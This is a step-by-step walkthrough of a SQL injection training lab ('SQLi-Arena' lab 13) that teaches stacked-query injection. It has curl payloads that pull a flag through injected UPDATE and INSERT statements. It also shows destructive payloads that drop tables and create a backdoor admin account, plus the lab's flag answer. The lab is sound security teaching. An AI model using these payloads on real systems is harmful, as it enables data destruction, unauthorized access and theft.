<h4>Step 1: Normal Search</h4>
<p>
    Start by searching for a known author to see how the application works normally.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab13" --data-urlencode "author=alice"<br>
        <span class="prompt">Query: </span>SELECT title, content, author FROM notes WHERE author = 'alice'<br>
        <span class="prompt">Result: </span>Meeting Notes | [content] | alice<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Project Plan | [content] | alice
    </div>
</div>

<h4>Step 2: Confirm SQL Injection</h4>
<p>
    Use a classic OR-based payload to confirm the injection point.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Confirm Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab13" --data-urlencode "author=' OR 1=1 -- -"<br>
        <span class="prompt">Query: </span>SELECT title, content, author FROM notes WHERE author = '' OR 1=1 -- -'<br>
        <span class="prompt">Result: </span>All 6 notes returned (Meeting Notes, Project Plan, Bug Report #42, Server Maintenance, API Documentation, Security Audit) -- injection confirmed!
    </div>
</div>

<h4>Step 3: Understand Stacked Queries</h4>
<p>
    The key difference in this lab is <code>mysqli_multi_query()</code>. Unlike
    <code>mysqli_query()</code>, it allows <strong>multiple SQL statements</strong> separated
    by semicolons. This means we can terminate the SELECT and run any additional SQL statement.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Stacked Queries Concept</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Normal query:</span><br>
        SELECT title, content, author FROM notes WHERE author = 'alice'<br><br>
        <span class="prompt">// With stacked query injection:</span><br>
        SELECT title, content, author FROM notes WHERE author = ''; UPDATE notes SET content = 'HACKED'; -- -'<br><br>
        <span class="prompt">// Two statements execute:</span><br>
        1) SELECT ... WHERE author = ''<br>
        2) UPDATE notes SET content = 'HACKED'
    </div>
</div>

<h4>Step 4: Update a Note with the Flag</h4>
<p>
    Use a stacked query to <code>UPDATE</code> an existing note&rsquo;s content with the flag
    from the <code>flag_store</code> table using a subquery.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Inject the UPDATE</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab13" \<br>
        &nbsp;&nbsp;--data-urlencode "author='; UPDATE notes SET content = (SELECT flag_text FROM flag_store LIMIT 1) WHERE id = 1; -- -"<br><br>
        <span class="prompt">Query executed: </span><br>
        SELECT title, content, author FROM notes WHERE author = '';<br>
        UPDATE notes SET content = (SELECT flag_text FROM flag_store LIMIT 1) WHERE id = 1;<br>
        -- -'<br><br>
        <span class="prompt">Result: </span>No notes found for that author. (author = '' matches nothing, but the UPDATE ran silently!)
    </div>
</div>

<h4>Step 5: Read the Updated Note</h4>
<p>
    Now search for the note with <code>id = 1</code> to see the flag that was injected into
    its content field.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Read the Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab13" --data-urlencode "author=' OR id=1 -- -"<br>
        <span class="prompt">Query: </span>SELECT title, content, author FROM notes WHERE author = '' OR id=1 -- -'<br><br>
        <span class="prompt">Result:</span><br>
        Title: Meeting Notes<br>
        Content: <strong>FLAG{st4ck3d_qu3r13s_mult1}</strong><br>
        Author: alice
    </div>
</div>

<p>
    The note content has been replaced with the flag value from <code>flag_store</code>!
</p>

<h4>Step 6: Alternative. INSERT into Verification Table</h4>
<p>
    Another approach: use stacked queries to INSERT the flag into a table you can read,
    or even create a new table entirely.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Alternative Approach</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// INSERT flag into a note title for easier visibility:</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab13" \<br>
        &nbsp;&nbsp;--data-urlencode "author='; INSERT INTO notes (title, content, author) VALUES ((SELECT flag_text FROM flag_store LIMIT 1), 'extracted', 'hacker'); -- -"<br>
        <span class="prompt">Response: </span>No notes found for that author. (INSERT executed silently)<br><br>
        <span class="prompt">// Then search for 'hacker' to see the inserted note:</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab13" --data-urlencode "author=hacker"<br>
        <span class="prompt">Result: </span>Title: <strong>FLAG{st4ck3d_qu3r13s_mult1}</strong> | Content: extracted | Author: hacker
    </div>
</div>

<h4>Step 7: Destructive Potential of Stacked Queries</h4>
<p>
    Stacked queries are particularly dangerous because they allow <strong>any SQL statement</strong>,
    not just data extraction:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Destructive Examples (DO NOT run these)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Drop a table:</span><br>
        '; DROP TABLE notes; -- -<br><br>
        <span class="prompt">// Create a backdoor account:</span><br>
        '; INSERT INTO users (username, password, role) VALUES ('backdoor', 'pass123', 'admin'); -- -<br><br>
        <span class="prompt">// Modify data:</span><br>
        '; UPDATE users SET role = 'admin' WHERE username = 'attacker'; -- -
    </div>
</div>

<h4>Step 8: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{st4ck3d_qu3r13s_mult1}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Stacked queries are possible when the application uses
    functions like <code>mysqli_multi_query()</code> that accept multiple statements. This
    elevates a simple read-only injection to full <strong>read/write/delete</strong> access.
    Most modern frameworks use <code>mysqli_query()</code> (single statement only) or prepared
    statements, which prevent stacked queries. Always use <strong>parameterized queries</strong>
    and avoid <code>multi_query()</code> with user-controlled input.
</div>
